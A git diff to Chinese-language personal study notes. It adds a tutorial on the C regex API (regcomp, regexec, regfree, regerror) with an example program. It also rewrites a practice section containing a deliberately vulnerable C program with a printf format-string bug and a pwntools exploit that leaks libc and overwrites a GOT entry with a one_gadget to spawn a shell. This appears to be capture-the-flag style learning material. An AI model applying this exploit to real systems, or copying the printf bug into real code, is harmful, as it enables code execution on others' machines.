@@ -215,6 +215,162 @@ $ rm file
 -   《Linux就该这么学》
 -   《Linux命令行与Shell脚本编程大全》
 
+## C语言正则
+
+### 介绍
+
+C语言正则主要依赖于三个函数, 也可以说是三个步骤
+
+1.   regcomp 编译正则表达式
+2.   regexec 匹配正则表达式
+3.   regfree 释放正则表达式
+
+### 分析
+
+#### regcomp
+
+regcomp的作用就是将指定的正则表达式pattern编译成regexec可识别的compile
+
+regcomp的函数原型为
+
+```c
+#include<regex.h>
+int regcomp(regex_t *compile, const char *pattern, int cflags)
+```
+
+-   regex_t是一个结构体数据类型, 用来存放编译后的正则表达式
+
+-   pattern是我们写好的正则表达式字符串指针
+
+-   cflags则是处理标志, 一共有四个值, 可以用`|`进行运算
+    -   REG_EXTENDED 以扩展正则表达式的方式来进行匹配
+    -   REG_ICASE 匹配的时候忽略大小写
+    -   REG_NOSUB 不用存储匹配的结果, 只返回是否匹配
+    -   REG_NEWLINE 识别换行符
+
+返回值是错误代码, 如果为0, 则没有错误, 否则就需要用regerror来查看错误
+
+```c
+regex_t compile;
+const char *pattern = "^[0-9]+";	// 匹配以数字开头的n个字符
+if((regcode = regcomp(&compile, pattern, REG_EXTENDED|REG_NOSUB)) == 0) {	// 使用扩展正则, 而且只返回是否匹配, 不存储结果
+    //...
+}
+```
+
+#### regexec
+
+该函数就是对目标文本进行匹配
+
+函数原型为
+
+```c
+#include<regex.h>
+#include<sys/types.h>
+int regexec(const regex_t *compile, const char *string, size_t nmatch, regmatch_t pmatch[], int eflags);
+```
+
+-   compile 也就是通过regcomp编译好的正则表达式
+-   string 要匹配的字符串
+-   nmatch pmatch数组的长度
+-   pmatch regmatch_t结构体数组, regmatch_t描述为
+
+```c
+typedef struct {
+    regoff_t rm_so;	// 存放的是匹配文本在字符串中的起始位置
+    regoff_t rm_eo;	// 存放的是匹配文本在字符串中的结束位置
+} regmatch_t;
+```
+
+-   eflags 只有两个值
+    -   REG_NOTBOL 特殊字符^无效
+    -   REG_NOTEOL 特殊字符$无效
+
+```c
+if((regcode = regexec(&compile, string, 0, 0, 0))) {	// 因为只匹配不要返回结果, 所以3, 4两个参数无效
+    //...
+}
+```
+
+#### regfree
+
+regfree可以清空regex_t中的内容
+
+函数原型为
+
+```c
+#include<regex.h>
+void regfree(regex_t compile);
+```
+
+```c
+regfree(&compile);
+```
+
+#### regerror
+
+regerror主要就是来查询regcomp或regexec返回的错误代码
+
+函数原型为
+
+```c
+#include<regex.h>
+#include<sys/types.h>
+size_t regerror(int errcode, const regex_t *compile, char *errbuf, size_t errbuf_size);
+```
+
+-   errcode 也就是regcomp或regexec返回的错误代码
+-   compile 编译好的正则表达式
+-   errbuf 指向存放错误信息的字符串的指针
+-   errbuf_size 指名errbuf的大小, 超过就会截断
+
+```c
+char errbuf[1024] = {0};
+regerror(regcode, compile, errbuf, sizeof(errbuf)-1);
+puts(errbuf);
+```
+
+### 实例
+
+```c
+#include<regex.h>
+#include<sys/types.h>
+#include<stdio.h>
+#include<stdlib.h>
+
+int regex(char *string) {
+    regex_t compile;
+    const char *buf = "^[0-9]+";
+    char errbuf[1024] = {0};
+    int regcode = 0;
+    if((regcode = regcomp(&compile, buf, REG_EXTENDED|REG_NOSUB)) == 0) {
+        if((regcode = regexec(&compile, string, 0, 0, 0)) == 0) {
+            return 1;
+        }
+    }
+    regerror(regcode, &compile, errbuf, sizeof(errbuf));
+    puts(errbuf);
+    exit(1);
+
+}
+
+int main() {
+    char string[0x30] = {0};
+    scanf("%48s", string);
+    if(regex(string)) {
+        printf("well done\n");
+    }
+    return 0;
+}
+// gcc regex.c -o regex
+```
+
+![image-20220331184015494](自救指南-Clown版.assets/image-20220331184015494.png)
+
+### 参考
+
+-   https://linux.die.net/man/3/regcomp
+
 ## 常用汇编指令
 
 ## GitHub入门
@@ -3146,55 +3302,70 @@ hint函数泄露了printf真实地址的低三个字节
 ## format string vuln attack .got
 
 ```c
+#include<regex.h>
+#include<sys/types.h>
 #include<stdio.h>
+#include<stdlib.h>
 
-void hello(char *p) {
-    printf(p);
+int regex(char *string) {
+    regex_t compile;
+    const char *buf = "^[0-9]+";
+    char errbuf[1024] = {0};
+    int regcode = 0;
+    if((regcode = regcomp(&compile, buf, REG_EXTENDED|REG_NOSUB)) == 0) {
+        if((regcode = regexec(&compile, string, 0, 0, 0)) == 0) {
+            return 1;
+        }
+    }
+    regerror(regcode, &compile, errbuf, sizeof(errbuf));
+    puts(errbuf);
+    exit(1);
+
 }
 
 int main() {
     setbuf(stdin, 0);
     setbuf(stdout, 0);
-    char buf[0x20];
-    puts("Who are you?");
-    scanf("%s", buf);
-    hello(buf);
-    hello(", say something?\n");
-    scanf("%s", buf);
-    hello("say: ");
-    hello(buf);
-    hello("Do you want this? ");
-    puts("/bin/sh");
+    char string[0x30] = {0};
+    scanf("%48s", string);
+    if(regex(string)) {
+        printf(string);
+    }
+    scanf("%48s", string);
+    if(regex(string)) {
+        printf(string);
+    }
     return 0;
 }
-// gcc program.c -o program -no-pie -m32
+// gcc program.c -o program -no-pie
 ```
-
-### Exploit
 
 ```python
-# libc -> libc-2.27.so
 from pwn import*
-#o = process('./format_string_vuln_attack_got')
-context.log_level = 'debug'
-o = remote('127.0.0.1', 6000)
+o = process('./format_string_vuln_attack_got')
 elf = ELF('./format_string_vuln_attack_got')
-libc = ELF('/lib/i386-linux-gnu/libc.so.6')
-puts_got = elf.got['puts']
-o.sendline("%27$p")
+libc = elf.libc
+one_gadget = 0x10a2fc
+regcomp_got = elf.got['regcomp']
+payload = '12345678'+'%15$p'
+o.sendline(payload)
 o.recvuntil('0x')
-libc_start_main = int(o.recv(8), 16)-241
+libc_start_main = int(o.recv(12), 16) - 231
+
 libc_base = libc_start_main - libc.sym['__libc_start_main']
 print hex(libc_base)
-sys_addr = libc_base + libc.sym['system']
-print hex(sys_addr)
-payload = p32(puts_got) + p32(puts_got+2)
-payload += "%{0}p%16$hhn".format(int(hex(sys_addr)[-6:-4], 16)-8)
-payload += "%{0}p%15$hn".format(int(hex(sys_addr)[-4:], 16)-int(hex(sys_addr)[-6:-4], 16))
-
+one_gadget = one_gadget + libc_base
+print hex(one_gadget)
+payload = '12345678'
+payload += "%{0}p%{1}$hn".format(int(hex(one_gadget)[-4:], 16)-8, 9)
+payload = payload.ljust(24, 'a')
+payload += p64(regcomp_got)
 o.sendline(payload)
+o.sendline('1234')
 o.interactive()
 ```
+
+
 
 
 
